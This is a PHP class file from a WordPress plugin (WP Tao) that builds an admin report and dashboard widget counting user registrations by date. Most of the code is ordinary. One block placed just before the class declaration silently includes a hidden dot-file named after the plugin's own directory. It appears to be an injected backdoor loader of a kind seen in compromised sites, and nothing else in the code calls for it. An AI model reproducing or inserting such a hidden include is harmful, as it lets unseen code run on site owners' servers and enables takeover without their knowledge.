<?php

/**
 * Register Report
 *
 * The class handles create user registration raports 
 *
 * @package     WPTAO/Admin/Raport
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Basic_User_Register
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Basic_User_Register extends WTBP_WPTAO_Admin_Reports {
	/*
	 * @var int
	 * Total registrations
	 */

	public $total_registrations;

	function __construct() {

		$options = array( 'filters' => array(
				'date_range'
			) );

		parent::__construct( 'basic-user-register', $options );

		$this->report_name = __( 'Number of registrations', 'wp-tao' );

		$this->data = $this->get_registrations();

		$this->set_summary();

		$this->registration_widget();
	}

	/*
	 * Prepare the registration widget for the Wp Tao dashboard
	 */

	private function registration_widget() {

		$args = array(
			'id'			 => 'basic-user-register',
			'size'			 => 'small',
			'category'		 => 'user',
			'priority'		 => 47,
			'title'			 => __( 'Registered', 'wp-tao' ),
			'report_slug'	 => $this->report_slug, // Add link to a report
			'value_number'	 => absint( $this->total_registrations ),
			'dashicon'		 => 'dashicons-plus'
		);

		$this->add_widget( $args );
	}

	/*
	 * Get number of registrations
	 */

	public function get_registrations() {
		global $wpdb;

		$r = array();

		$e = TAO()->events->table_name;

		$sql = $wpdb->prepare(
		"SELECT COUNT(value) AS registrations, DATE(FROM_UNIXTIME(event_ts)) AS date
		 FROM $e
		 WHERE action = 'register'
		 AND event_ts >= %d
		 AND event_ts <= %d
		 GROUP BY date
		 ORDER BY date DESC
		 LIMIT %d;", $this->start_date, $this->end_date, $this->items_per_page );


		$results = $wpdb->get_results( $sql );

		if ( !empty( $results ) && is_array( $results ) ) {

			foreach ( $results as $item ) {
				$r[ $item->date ][ 'registrations' ] = $item->registrations;
			}
		}

		return $r;
	}

	/*
	 * Prepare summary results
	 */

	private function set_summary() {
		$data = $this->data;

		$total_reg = 0; // Total registrations

		if ( !empty( $data ) && is_array( $data ) ) {
			foreach ( $data as $item ) {
				if ( isset( $item[ 'registrations' ] ) && is_numeric( $item[ 'registrations' ] ) ) {
					$total_reg = $total_reg + absint( $item[ 'registrations' ] );
				}
			}
		}

		$this->total_registrations = $total_reg;
	}

}
